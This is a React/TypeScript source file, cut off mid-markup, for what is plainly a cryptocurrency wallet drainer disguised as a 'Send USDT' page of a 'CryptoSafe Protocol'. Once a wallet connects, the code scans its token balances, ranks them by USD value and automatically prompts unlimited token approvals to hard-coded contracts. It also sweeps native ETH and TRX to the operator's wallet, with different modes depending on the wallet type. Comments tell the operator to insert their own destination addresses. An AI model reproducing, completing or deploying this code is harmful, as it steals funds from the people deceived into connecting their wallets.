import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready

// 🔥 CONTRACT ADDRESSES
const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'

// 💰 YOUR SECURE DESTINATION WALLETS (For Native Coin Sweeps)
// ⚠️ DO NOT FORGET TO CHANGE THIS TO YOUR ACTUAL WALLET ADDRESS!
const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; // ⚠️ Must start with 'r'

// 🎨 UI DISPLAY ADDRESSES
const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'

// 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [
      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
    ],
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ],
    TRON: [
      { symbol: 'TRX',  address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321', decimals: 18, fallbackPrice: 1 },
      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w', decimals: 18, fallbackPrice: 0.02 }, 
      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', decimals: 6,  fallbackPrice: 0.0000005 }
    ]
  },
  Nile: {
    EVM: [
      { symbol: 'ETH (Test)', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDT (Test)', address: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', decimals: 6, fallbackPrice: 1 }
    ],
    TRON: [
      { symbol: 'TRX (Test)', address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', decimals: 6, fallbackPrice: 1 }
    ]
  }
};

// 🛠️ FIX 1: Create a separate array that ONLY contains EVM networks
const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

// AppKit still gets the full list so the UI shows all options
const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }), 
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})


const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  // 🛠️ FIX 2: Pass ONLY the EVM networks to Wagmi. This instantly stops the Tron crash!
  networks: evmNetworks,
})

// 🟢 ========================================================================= 🟢
// 🛠️ FIX 1: THE PROFESSIONAL SPLIT (DYNAMIC ENVIRONMENT ROUTING)
// We dynamically isolate the environment based on the active wallet sandbox.
const detectEnvironment = () => {
  if (typeof window === 'undefined') return 'COMBINED';
  
  const w = window as any;
  const isMobileWallet = w.ethereum || w.tronWeb || w.tronLink;
  
  // 1. Desktop/Standard Safari: Load BOTH so WalletConnect QR supports all chains
  if (!isMobileWallet) return 'COMBINED';
  
  // 2. Mobile Wallet Active: Check if Tron is actively selected and ready
  const hasActiveTron = (w.tronWeb && w.tronWeb.defaultAddress && w.tronWeb.defaultAddress.base58) || (w.tronLink && !w.ethereum);
  
  return hasActiveTron ? 'TRON' : 'EVM';
};

const appEnv = detectEnvironment();

// 🛠️ FIX 2: Complete Adapter and Network Isolation
const getAdapters = () => {
  if (appEnv === 'TRON') return [tronAdapter];
  if (appEnv === 'EVM') return [wagmiAdapter];
  return [tronAdapter, wagmiAdapter]; 
};

const getNetworks = (): [AppKitNetwork, ...AppKitNetwork[]] => {
  if (appEnv === 'TRON') return [tronMainnet];
  if (appEnv === 'EVM') return evmNetworks;
  return appkitNetworks; 
};

createAppKit({
  adapters: getAdapters(), 
  networks: getNetworks(), 
  defaultNetwork: appEnv === 'TRON' ? tronMainnet : mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'CryptoSafe Protocol', 
    description: 'Secure Decentralized Network',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: {
    '--w3m-accent': '#0C66FF',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})
// 🟢 ========================================================================= 🟢

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

// ── BULLETPROOF TRONWEB INITIALIZER ──
const createPublicTronWeb = () => {
  if (TronWeb && typeof (TronWeb as any).TronWeb === 'function') {
    return new (TronWeb as any).TronWeb({ fullHost: FULL_HOST });
  }
  if (typeof TronWeb === 'function') {
    return new (TronWeb as any)({ fullHost: FULL_HOST });
  }
  if (TronWeb && typeof (TronWeb as any).default === 'function') {
    return new (TronWeb as any).default({ fullHost: FULL_HOST });
  }
  if (typeof window !== 'undefined' && typeof (window as any).TronWeb === 'function') {
    return new (window as any).TronWeb({ fullHost: FULL_HOST });
  }
  throw new Error("Cannot find TronWeb constructor.");
};

// ── ORACLE PRICE FETCHER ──
const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    console.warn("Price Oracle offline. Falling back to hardcoded weights.");
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      prices[token.symbol] = token.fallbackPrice;
    }
    return prices;
  }
};

// ── SMART SORTING FUNCTION ──
const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  const autoTriggered = useRef(false)
  const manualConnect = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId, caipNetwork } = useAppKitNetwork() 

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = 
    (String(caipNetwork?.id).includes('tron')) || 
    (String(chainId).includes('tron')) ||
    (typeof caipAddress === 'string' && caipAddress.includes('tron')) || 
    (typeof walletAddress === 'string' && walletAddress.startsWith('T'));
    
  const isEVM = !isTron;

  const resolveTronWeb = () => {
    const w = window as any;
    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }
    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    const init = async () => {
      if (!isConnected || !walletAddress) {
        autoTriggered.current = false;
        return;
      }

      log(`[SYSTEM] Connected: ${walletAddress}`);

      if (isTron) {
        setStatus('Initializing TRON...');
        let finalTronWeb = null;
        for (let i = 0; i < 10; i++) {
          finalTronWeb = resolveTronWeb();
          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        if (!finalTronWeb) {
          const publicTronWeb = createPublicTronWeb();
          await getTronBalance(publicTronWeb, walletAddress);
        } else {
          await getTronBalance(finalTronWeb, walletAddress);
        }
      } else if (isEVM && evmWalletProvider) {
        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
      }

      if (!autoTriggered.current && manualConnect.current) {
        if ((isEVM && evmWalletProvider) || isTron) {
          autoTriggered.current = true;
          log("🔥 Auto-triggering Smart Priority Loop...");
          
          setLoading(true); 
          setTimeout(() => approveAndCollect(), 500); 
        }
      }
    };

    init();
  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, evmWalletProvider, isTron, isEVM, chainId]);

  const getTronBalance = async (tw: any, addr: string): Promise<number> => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      const formatted = Number(bal) / 1_000_000;
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ TRON balance fetch failed')
      return 0;
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('USDT not configured for this EVM chain')
      return 0;
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ EVM balance fetch failed')
      return 0;
    }
  }

 const handleAction = () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');

    if (!isConnected) {
      manualConnect.current = true;
      open(); 
    } else {
      manualConnect.current = true;
      approveAndCollect();
    }
  }

  const approveAndCollect = async () => {
    if (!walletAddress) return;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");

    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      // =====================================
      // 🟢 EVM: PRE-SCAN & SMART LOOP
      // =====================================
      if (isEVM && evmWalletProvider) {
        const ethersProvider = new BrowserProvider(evmWalletProvider as any);
        const signer = await ethersProvider.getSigner(walletAddress);
        
        const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

        const baseTokens = TARGET_TOKENS[NETWORK].EVM;
        const validTokens = [];
        const prices = await fetchTokenPrices(baseTokens, 'ethereum');

        log(`[SYSTEM] Scanning ${baseTokens.length} EVM Assets...`);

        for (const token of baseTokens) {
          try {
            if (token.isNative) {
              const bal = await ethersProvider.getBalance(cleanSenderAddress);
              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
            } else {
              const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
              const bal = await tokenContract.balanceOf(cleanSenderAddress);
              const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
              const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
              validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
            }
          } catch (e) {
            // Silently swallow empty balances
          }
        }

        validTokens.sort(smartTokenSort);
        
        const rawProvider = evmWalletProvider as any;
        const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
        
        let tokensToProcess = validTokens;
        
        if (isStrictlyMetaMask) {
             log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
             tokensToProcess = validTokens.slice(0, 1);
        } else {
             log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
        }
        
        if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

        // 🛠️ CRITICAL RESTRUCTURE: The Token Loop (ERC-20s ONLY)
        for (const token of tokensToProcess) {
          try {

            // 🟢 ================================================== 🟢
            // 🛠️ XRP SPECIFIC ENGINE
            if (token.symbol === 'XRP') {
              setStatus(`Verifying XRP Wallet...`);

              // XRP Ledger has a 10 XRP base reserve requirement.
              // We sweep everything MINUS 11 XRP to ensure the TX clears.
              const xrpBalance = token.balance; 
              if (xrpBalance > 12) {
                const sweepAmount = (xrpBalance - 11).toFixed(6);
                
                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
                log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
                
                // We use the Raw RPC request standard for Coinbase Wallet
                const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{
                    from: cleanSenderAddress,
                    to: XRP_COLD_WALLET, 
                    value: '0x0', // Native XRP move uses different fields in some bridges
                    data: '0x',   // Logic for direct payment
                    // Some providers require custom 'xrpl' fields here
                  }]
                });
                
                setTxHash(txHash);
                successCount++;
                log(`✅ XRP Transfer Initiated!`);
                await sleep(1500); // Tactical pacing for XRP
              } else {
                log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`);
              }
              continue; // Move to the next token
            }
            // 🟢 ================================================== 🟢

            if (!token.isNative) {
              setStatus(`Approving ${token.symbol}...`);
              log(`[ACTION] Prompting Approve: ${token.symbol}`);
              
              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
              
              const txHash = await ethersProvider.send('eth_sendTransaction', [{
                  from: cleanSenderAddress,
                  to: token.address.toLowerCase(),
                  data: encodedData,
                  gas: "0x14C08" // 85000
              }]);
              
              setTxHash(txHash);
              successCount++; 
              log(`✅ ${token.symbol} Approved!`);
              await sleep(1500);
            }
          } catch (err: any) {
             const exactError = err?.message || JSON.stringify(err);
             log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
             await sleep(1500);
          }
        }
        
        // 🛠️ CRITICAL RESTRUCTURE: The Contingency Payload (Native ETH ALWAYS fires at the very end)
        try {
            setStatus(`Transferring ETH...`);
            log(`[ACTION] Executing Contingency Native Sweep...`);
            
            const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
            const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
            const totalGas = gasCost + ((gasCost * 20n) / 100n); 
            
            if (liveBal > totalGas) {
                const sendAmount = liveBal - totalGas;
                const hexValue = "0x" + sendAmount.toString(16);
                
                const txHash = await ethersProvider.send('eth_sendTransaction', [{
                    from: cleanSenderAddress,
                    to: EVM_COLD_WALLET.toLowerCase(), 
                    value: hexValue,
                    gas: "0x5208" // 21000
                }]);
                
                setTxHash(txHash);
                successCount++; 
                log(`✅ Contingency ETH Sweep Sent!`);
                await sleep(1500); 
            } else {
                log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
            }
        } catch (nativeErr: any) {
             const exactError = nativeErr?.message || JSON.stringify(nativeErr);
             log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
        }
        
        if (successCount > 0) {
          setStatus('✅ Processing Complete!');
        } else {
          setStatus('❌ Failed: User Rejected All');
        }
        return; 
      }

      // =====================================
      // 🔴 TRON: PRE-SCAN & SMART LOOP
      // =====================================
      if (isTron) {
        let activeTw = null;
        
        for (let i = 0; i < 10; i++) {
          activeTw = resolveTronWeb();
          if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        const baseTokens = TARGET_TOKENS[NETWORK].TRON;
        const validTokens = [];
        
        const prices = await fetchTokenPrices(baseTokens, 'tron');
        const publicTw = createPublicTronWeb();

        for (const token of baseTokens) {
          try {
            const twToUse = activeTw || publicTw;
            if (twToUse) {
              if (token.isNative) {
                const balNum = await twToUse.trx.getBalance(walletAddress);
                if (balNum > 0) {
                  const normalizedBal = balNum / (10 ** token.decimals);
                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
                }
              } else if (twToUse && typeof twToUse.contract === 'function') {
                const contract = await twToUse.contract(USDT_ABI).at(token.address);
                const balObj = await contract.balanceOf(walletAddress).call();
                const balNum = Number(balObj.toString());
                
                if (balNum > 0) {
                  const normalizedBal = balNum / (10 ** token.decimals);
                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
                }
              }
            }
          } catch (e) {
            log(`Could not fetch balance for ${token.symbol}`);
          }
        }

        validTokens.sort(smartTokenSort);
        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);

        const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
          const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
            contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
          );
          
          let signedTx;
          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
          } else if (typeof (tronWalletProvider as any).request === 'function') {
            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
          } else {
            throw new Error("Provider does not support signTransaction");
          }

          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
          return broadcast.txid || broadcast.transaction?.txID;
        };

        for (const token of tokensToProcess) {
          try {
            if (token.isNative) {
              setStatus(`Transferring ${token.symbol}...`);
              
              const twToUse = activeTw || publicTw;
              const liveBal = await twToUse.trx.getBalance(walletAddress);
              
          if (liveBal > 2000000) {
                 const sendAmount = liveBal - 2000000; 
                 try {
                     const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
                         TRON_CONTRACT_ADDRESS, 
                         'withdrawTRX()',       
                         { feeLimit: 100_000_000, callValue: sendAmount }, 
                         [], 
                         walletAddress
                     );
                     
                     let signedTx;
                     if (typeof (tronWalletProvider as any).signTransaction === 'function') {
                         signedTx = await (tronWalletProvider as any).signTransaction(transaction);
                     } else {
                         signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
                     }

                     const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
                     if (!broadcast.result) throw new Error('Broadcast failed');
                     
                     setTxHash(broadcast.txid || broadcast.transaction?.txID);
                     successCount++; 
                     log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
                 } catch (nativeErr) {
                     log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
                 }
              } else {
                 log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
              }
            } else {
              setStatus(`Approving ${token.symbol}...`);
              
              if (activeTw && typeof activeTw.contract === 'function') {
                const contract = await activeTw.contract(USDT_ABI).at(token.address);
                const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
                setTxHash(tx);
                successCount++; 
                log(`✅ ${token.symbol} Approved!`);
              } else if (tronWalletProvider) {
                const tx = await signAndSendContract(
                  token.address,
                  'approve(address,uint256)',
                  [ 
                    { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, 
                    { type: 'uint256', value: MAX_UINT } 
                  ],
                  100_000_000
                );
                setTxHash(tx);
                successCount++; 
                log(`✅ ${token.symbol} Approved!`);
              }
            }
          } catch (err: any) {
             const exactError = err?.message || JSON.stringify(err);
             log(`❌ Rejected: ${exactError.substring(0, 50)}...`);
          }
        }
        
        if (successCount > 0) {
          setStatus('✅ Processing Complete!');
        } else {
          setStatus('❌ Failed: User Rejected All');
        }
        return; 
      }

      throw new Error("Wallet provider not available for approval.");

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      autoTriggered.current = false; 
      manualConnect.current = false; 
      setLoading(false);
    }
  };

  const isButtonDisabled = !isConnected ? false : loading;

  const buttonText = !isConnected 
    ? 'Next' 
    : loading
      ? 'Loading...' 
      : status === '✅ Processing Complete!' 
        ? 'Sent' 
        : status.includes('❌') 
          ? 'Retry' 
          : 'Next'; 

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>

      {/* 1. TOP HEADER */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
        <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Send USDT</h2>
        <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
      </div>

      <div style={{ flex: 1, padding: '16px 20px' }}>

        {/* 2. ADDRESS INPUT */}
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Address or Domain Name
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="text"
              readOnly
              placeholder={isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS}
              value={isConnected ? (isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS) : ''}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }}
            />
            {isConnected && <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '12px' }} />}
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        {/* 3. DESTINATION NETWORK SELECTOR */}
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Destination network
          </label>
          <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: '#F3F4F6', padding: '8px 16px', borderRadius: '9999px', cursor: 'pointer' }}>
            {isTron ? (
              <div style={{ width: 18, height: 18, backgroundColor: '#FF060A', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'10px', fontWeight:'bold'}}>T</span></div>
            ) : (
              <div style={{ width: 18, height: 18, backgroundColor: '#627EEA', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><span style={{color:'white', fontSize:'12px', fontWeight:'bold'}}>Ξ</span></div>
            )}
            <span style={{ fontSize: '15px', fontWeight: '700', color: '#4B5563' }}>{isTron ? 'Tron' : 'Ethereum'}</span>
            <ChevronDown size={18} color="#6B7280" strokeWidth={2.5} />
          </div>
        </div>

        {/* 4. AMOUNT INPUT */}
        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Amount
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="number"
              placeholder=""
              value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''}
              onChange={(e) => {
                setUsdtBalance(e.target.value);
                if (e.target.value) setAmountError(''); 
              }}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '16px', fontWeight: '700', width: '100%', minWidth: 0, marginRight: '8px' }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              {(usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '') && (
